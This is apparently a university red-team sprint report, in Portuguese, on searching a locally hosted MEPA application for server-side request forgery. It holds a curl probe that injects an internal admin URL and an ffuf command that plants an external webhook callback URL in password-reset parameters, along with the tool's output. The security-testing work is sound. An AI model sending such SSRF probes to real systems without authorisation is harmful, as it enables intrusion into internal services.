# Relatório Sprint 1

## MEPA RED TEAM

* Carlos - 221031265
* João - 200058525
* Luis - 180066161
* Vinicius - 160147816

## Atividades realizadas

Durante esta sprint focamos nas seguintes atividades principais:

* **Configuração do ambiente**: Subimos o ambiente do MEPA localmente em nossas máquinas.

* **Exploração inicial da estrutura do projeto**: Realizamos uma análise preliminar da arquitetura e das rotas da API do MEPA, com o objetivo de identificar pontos que possam ser suscetíveis a vulnerabilidades do tipo SSRF.

* **Estudo sobre SSRF (Server-Side Request Forgery)**: Dedicamos tempo ao estudo teórico sobre a vulnerabilidade SSRF, utilizando as referências de estudo.



## Exploração inicial

### Teste com `curl`

Executamos um teste básico utilizando `curl` para verificar o comportamento da aplicação ao receber uma URL como parâmetro:

```
curl -L -v "http://localhost:8000/api?next=http://localhost:8000/api/admin/" -H "Cookie: sessionid=s24ols0or42p5ib616yv1q3wglcvi3le"
```

O objetivo era verificar se a aplicação realiza alguma requisição server-side para o endereço fornecido no parâmetro `next`, comportamento característico de uma vulnerabilidade SSRF.

### Fuzzing com FFUF

Realizamos fuzzing utilizando o **FFUF** para explorar potenciais pontos vulneráveis nas rotas da API do MEPA, enviando URLs para verificar se a aplicação realiza requisições.

Exemplo de um dos testes realizados:

```
ffuf -u "http://localhost:8000/api/reset-password/?FUZZ=https://webhook.site/b68374b4-2735-4223-92df-eb8b00bb7610" -H "Authorization: Bearer d71d2033f406250611bf1f09471f56ba2aab7f4c" -w wordlist-ssrf.txt -fs 0
```

```
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://localhost:8000/api/reset-password/?FUZZ=https://webhook.site/b68374b4-2735-4223-92df-eb8b00bb7610
 :: Wordlist         : FUZZ: /home/carlos/Documentos/UnB/2025.1/GCES/SSRF/wordlist-ssrf.txt
 :: Header           : Authorization: Bearer d71d2033f406250611bf1f09471f56ba2aab7f4c
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

:: Progress: [6477/6477] :: Job [1/1] :: 28 req/sec :: Duration: [0:04:33] :: Errors: 0 ::
```


## Dificuldades encontradas

* Determinar quais pontos da aplicação são, de fato, suscetíveis à exploração de SSRF.

## Próximos passos

* Aprofundar a análise de possíveis pontos vulneráveis.
* Realizar testes práticos de SSRF utilizando ferramentas especializadas, como **SSRFmap** e **Burp Suite**, para automatizar e potencializar a detecção e exploração de vulnerabilidades.
* Continuar o estudo sobre SSRF.